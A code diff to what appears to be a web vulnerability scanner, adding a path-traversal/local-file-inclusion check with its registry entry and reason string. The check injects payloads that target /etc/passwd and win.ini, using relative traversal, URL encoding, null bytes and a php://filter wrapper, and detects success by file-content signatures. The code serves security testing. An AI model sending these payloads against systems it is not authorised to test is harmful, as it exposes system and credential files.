@@ -556,6 +556,57 @@ def command_injection(ctx, probe) -> bool | None:
     return False if tested else None
 
 
+# Path traversal / local file inclusion — read a file outside the intended directory via a filename
+# param. Comprehensive: absolute paths, ../ traversal (raw / doubled / URL-encoded), null-byte, php://
+# wrapper; Unix (/etc/passwd) + Windows (win.ini). Detection = the target file's unmistakable content
+# signature, which reflecting the path string can never produce -> precise.
+_LFI_SIG = re.compile(r"root:.*?:0:0:|\[fonts\]|\[extensions\]|for 16-bit app support", re.IGNORECASE)
+_LFI_PARAMS = ("page", "file", "path", "include", "template", "doc", "filename", "load", "view", "dir")
+_INCLUDABLE = re.compile(r"fi|includ|file|page|view|download|load|template|doc|read|show", re.IGNORECASE)
+_LFI_PAYLOADS = (
+    "/etc/passwd", "../../../../../../../etc/passwd", "....//....//....//....//etc/passwd",
+    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd%00", "../../../../etc/passwd%00.png",
+    "C:\\Windows\\win.ini", "..\\..\\..\\..\\..\\Windows\\win.ini",
+    "php://filter/convert.base64-encode/resource=/etc/passwd",
+)
+
+
+def path_traversal(ctx, probe) -> bool | None:
+    """Path traversal / LFI across forms, discovered query params, and common filename params on
+    includable-looking GET routes. Injects absolute / relative / encoded / null-byte / php-wrapper
+    payloads for /etc/passwd and win.ini; fires on the file's content signature. N/A when no surface."""
+    # LFI is a GET-filename vuln -> test query params + includable routes FIRST, forms last, so a large
+    # form set can't exhaust the budget before the real vector (a ?page=/?file=) is reached.
+    q = [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
+         if e.method.lower() == "get" and e.query_params]
+    incl = [(rt, "get", list(_LFI_PARAMS)) for rt in ctx.profile.routes if _INCLUDABLE.search(rt)]
+    forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
+    targets = q + incl + forms
+    if not targets:
+        return None
+    budget = probe.probe.get("max_attempts", 200)
+    tested = False
+    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
+        for action, method, fields in targets:
+            for field in fields:
+                for payload in _LFI_PAYLOADS:
+                    if budget <= 0:
+                        break
+                    budget -= 1
+                    tested = True
+                    data = {fn: (payload if fn == field else _XSS_FILLER) for fn in fields}
+                    try:
+                        if _LFI_SIG.search(_xss_send(c, method, action, data).text):
+                            return True  # returned the contents of a system file -> traversal/LFI
+                    except (httpx.HTTPError, httpx.InvalidURL):
+                        continue
+                if budget <= 0:
+                    break
+            if budget <= 0:
+                break
+    return False if tested else None
+
+
 # API BOLA / horizontal IDOR (OWASP API-Security #1): an object created by user A is readable by
 # user B. Verified with a planted canary — B's read must return A's SECRET value (not just a 2xx, and
 # not the id A chose, which legitimately echoes back), so a token-scoped or no-op endpoint can't false
@@ -961,6 +1012,7 @@ PREDICATES = {
     "api_sqli": api_sqli,
     "xss_injectable": xss_injectable,
     "command_injection": command_injection,
+    "path_traversal": path_traversal,
     "api_bola": api_bola,
     "session_cookie_missing_flag": session_cookie_missing_flag,
     "login_no_rate_limit": login_no_rate_limit,
@@ -1000,6 +1052,7 @@ _PREDICATE_REASONS = {
     "api_sqli": "a parameter is SQL-injectable (error / boolean / UNION / time-based)",
     "xss_injectable": "an input reflects unescaped into HTML (XSS: script / img / svg / attribute / stored)",
     "command_injection": "an input reaches an OS shell (injected command executed: separator / substitution / time-based)",
+    "path_traversal": "a filename param served a file outside the web root (path traversal / local file inclusion)",
     "api_bola": "one account's object (and its secret) was readable by another account (broken object-level auth)",
     "session_cookie_missing_flag": "session cookie missing the {flag} flag",
     "csrf_missing": "state-changing POST accepted cross-site with no token / SameSite",
